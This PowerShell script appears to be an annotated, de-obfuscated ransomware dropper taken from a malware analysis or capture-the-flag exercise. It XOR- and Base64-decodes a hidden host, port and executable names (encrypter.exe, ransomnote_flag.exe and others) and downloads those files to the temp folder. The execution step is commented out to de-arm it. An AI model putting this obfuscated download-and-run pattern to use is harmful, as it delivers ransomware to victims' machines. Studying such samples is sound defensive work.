$xs = "HR8YHRgZHhoeEgYeGBwcHAZPRElYU1peT1gET1JPBklFRF5YRUYET1JPBlhLRFlFR0RFXk91TEZLTQRPUk8GTUVOTwRPUk8=";

# From Base64 -> XOR 42
function Get-Decode {
  param($I);
  Write-Output ([System.Text.Encoding]::UTF8.GetString((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($I))).ToCharArray()|%{$_ -bxor 42})))
};

# Decrypting $xs yields 7527234048,42666,encrypter.exe,control.exe,ransomnote_flag.exe,gode.exe
$s = Get-Decode($xs);

# Take very first value and decode it to a hex value 0xc0a87a01
$t=(([int64]($s.split(',')[0])-[uint32]::MaxValue).tostring("x8"))

# Loop over what seems to be file names encrypter.exe,control.exe,ransomnote_flag.exe,gode.exe
# 
$s.split(",")[-4..-1] | % {
  $l = $t,
    ( "{0}" -f (Get-FileHash -InputStream ([IO.MemoryStream]::new([byte[]][char[]]$t)) -Algorithm SHA256).hash),
    $_,
    "http",
    $s.split(",")[1],
    ":",
    "/",
    "0x";
  # Debug print
  $uri = "{3}{5}{6}{6}{7}{0}{5}{4}{6}{1}{6}{2}" -f $l;
  $target = "$env:TEMP\{2}" -f $l;
  Write-Output "Downloading $uri to $target";
  (New-Object System.Net.WebClient).DownloadFile(("{3}{5}{6}{6}{7}{0}{5}{4}{6}{1}{6}{2}" -f $l),("$env:TEMP\{2}" -f $l));
  # De-arm this script by commenting out Start-Process
  #Start-Process ("$env:TEMP\{2}" -f $l);
 };
 